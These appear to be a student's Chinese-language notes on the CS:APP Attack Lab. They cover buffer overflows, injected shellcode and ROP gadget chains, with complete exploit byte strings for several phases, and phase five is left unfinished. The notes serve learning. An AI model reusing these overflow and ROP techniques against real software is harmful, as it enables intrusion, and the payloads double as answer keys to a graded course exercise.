# 1.
test call getbuf
getbuf给了40个字节的缓冲区

![[Pasted image 20250905151221.png]]
40个占位字节
接上touch1 的地址
# 2.
![[Pasted image 20250905151251.png]]
``` 
0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
7:   68 ec 17 40 00          push   $0x4017ec
c:   c3                      ret
```
指令13字节 27个占位 溢出的地址为getbuf的栈指针处
ret溢出地址时 执行三行攻击代码
攻击代码的ret先从栈里读地址 读来的地址是touch2的 然后jump到touch2

# 3.
match 和cmp可能覆盖getbuf的栈帧
没说test 所以test是安全的
卡在这好久
但是怎么验证test安全啊

每当一个函数被调用时，一个新的栈帧就被创建（压栈）；当函数返回时，其栈帧就被销毁（弹栈）。
实际上是ret的弹栈让栈指针移动 栈帧空间就可用视为被消除了
test调用getbuf 
	getbuf调用gets
		gets ret
	getbuf ret
test本应return时 调用了touch3
	touch3
		hexmatch
		strncmp
test的栈帧在调用touch3时都未消失
![[Pasted image 20250906103049.png]]


getbuf分配栈帧之前 栈指针值是0x5561dca0 指向0x401976
getbuf执行完以后不回test了
去touch3
dca0到dca7放touch3的地址

dca8及其高位是test的栈帧其他部分
由于test现在没用了 可以被覆盖 这里可用来放cookie

字符串在内存中的存储和读取**总是从低地址到高地址顺序**，这与字节序（大端/小端）无关

攻击代码中包含
##### 1.
![[Pasted image 20250906105655.png]]
指令
cookie赋值rdi 
ret到touch3

##### 2.
ret到指令开始处 使字节形式的指令可被执行

执行注射的攻击代码是从低地址开始执行
即 0x5561dca0 -0x28 =0x5561dc78
ret到78这个地址
48 c7 c7 a0 dc 61 55                                      
68 fa 18 40 00         
c3               



```
48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3   //指令
11 22 33 44 55 66 77 88 99 00 
11 22 33 44 55 66 77 88 99 00            //占位
11 22 33 44 55 66 77 
78 dc 61 55 00 00 00 00                  // touch3的地址
35 39 62 39 39 37 66 61 00               // cookie的字节字符串形式
```

# 4
![[Pasted image 20250908092401.png]]
nop就相当于这一行是占位的 别的指令也会让程序计数器变动

![[Pasted image 20250908092514.png]]

level2中
注入攻击代码时

其实是在做三件事
rdi赋值
栈顶设为touch2地址
弹栈
jump

farm里没找到cookie值的构建方式
看到48 89 c7 本来想用mov rax rdi的

也没找到touch2的地址表现形式

**看到题的时候应该意识到这些立即数没有意义的**
**立即数应该是用来凑指令的**

作为攻击者可以控制栈
所以这两个应该是要通过栈自己输入的





### 停一下
让卡成傻逼了
捋一下
上午没推动是因为 思路单一 且难以实现
教训是
1. 优化解决问题的**流程**

判断思路可行性以后再推进 推不动就看看能不能换思路
	1. 通过立即数用rax和rdx凑出个cookie值来 最扯淡的一个 盯着这个猛钻牛角尖
	2. 栈里写入cookie pop进rax等寄存器再 mov 进rbx 。能直接pop进rbx的话更好
	3. cookie放栈里 rsp偏移得到cookie地址 再mov
2. 知识漏洞
	1. pop和push会让栈指针如何移动 
	2. ret时栈帧消失 栈指针怎么动的
	3. 缓冲区什么时候消失的 栈指针和缓冲区生灭的关系
现在我们需要做的是
把栈指针的移动搞清楚 
剩下的应该迎刃而解了

哈哈 没好好看汇编代码
1. pop先mov再+8 push先-8再mov
2. ret本质是pop+jump 。栈指针+8
3. ret之前有指令让栈指针+0x28
脑子浑着不知道在搞啥 明天早上没搞完的问题细节回想清楚再开搞
## 解
没有5f 不能直接pop进rdi
找别的
![[Pasted image 20250908200050.png]]
```
4019ab
pop rax
nop
ret
```
![[Pasted image 20250908195450.png]]
`mov rax rdi
`ret

ret以后rsp+8
```


ec 17 40 00 00 00 00 00	    <-rsp 4 ret 后+8到这里   4019a2段的ret 这句进rip
a2 19 40 00 00 00 00 00     <-rsp 3 4019ab段ret的pop 这句进rip
                            <-rsp 2 pop后栈指针上移到这里
fa 97 b9 59 00 00 00 00      4019ab段pop先读cookie 进rax
						    <-rsp 1       getbuf ret后+8到这里
ab 19 40 00 00 00 00 00                   getbuf ret时 这一句进rip
                            <-rsp 0       getbuf中rsp+0x28后到这里
11 22 33 44 55 66 77 88        
11 22 33 44 55 66 77 88      //占位
11 22 33 44 55 66 77 88
11 22 33 44 55 66 77 88
11 22 33 44 55 66 77 88
```
程序指向时 由低地址到高地址 读字节也是由低到高

然后需要ret到touch2
move进别的寄存器
然后mov进rsp
ret进touch2


![[Pasted image 20250908202627.png]]
`mov rax rsp`
`ret`

上面的代码从上到下对应地址由高到低的
答案应该这样
```
11 22 33 44 55 66 77 88
11 22 33 44 55 66 77 88
11 22 33 44 55 66 77 88
11 22 33 44 55 66 77 88
11 22 33 44 55 66 77 88
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```
unix> ./hex2raw < My_ans.txt | ./rtarget -q

过了 嗨害嗨


# 5
挑战一把
原来的3
mov 地址 rdi
cookie是放test的栈帧里的 位置是自己选的 可控的 
现在位置会变的

怎么放cookie字符形式呢

1. 放栈上 mov rsp rdi
2. 栈mov到中转寄存器 mov进rdi

找到了 rax中转

![[Pasted image 20250908212114.png]]
```
401a06
mov rsp rax
ret
```




```


35 39 62 39 39 37 66 61 00  401a06的rsp把这行的起始地址进rsi  我靠需要挪一下栈指针
//getbuf ret 的pop后rsp到这里
06 1a 40 00 00 00 00 00  getbuf ret时这行进rip
//getbuf rsp+0x28到这里
11 22 33 44 55 66 77 88
11 22 33 44 55 66 77 88
11 22 33 44 55 66 77 88
11 22 33 44 55 66 77 88
11 22 33 44 55 66 77 88低


```
**我靠需要挪一下栈指针**
pop地址进别的寄存器再mov进rsp或许能解决
但是没有指令

![[Pasted image 20250908214302.png]]
思路断了 

通过互联网搜索注意到有add_xy     ：）
所以说我们连有啥函数都没看完

rsp赋给rdi 然后算rsi应该是几
给rax以后 再mov进rdi

但是没有mov rsp rdi
只有mov rsp rax


![[Pasted image 20250908212114.png]]
```
401a06
mov rsp rax
ret
```

**有mov eax edi** 
![[Pasted image 20250909212904.png]]


rsi的话
没有pop rsi

```








	//getbuf rsp+0x28到这里
11 22 33 44 55 66 77 88
11 22 33 44 55 66 77 88
11 22 33 44 55 66 77 88
11 22 33 44 55 66 77 88
11 22 33 44 55 66 77 88低








```
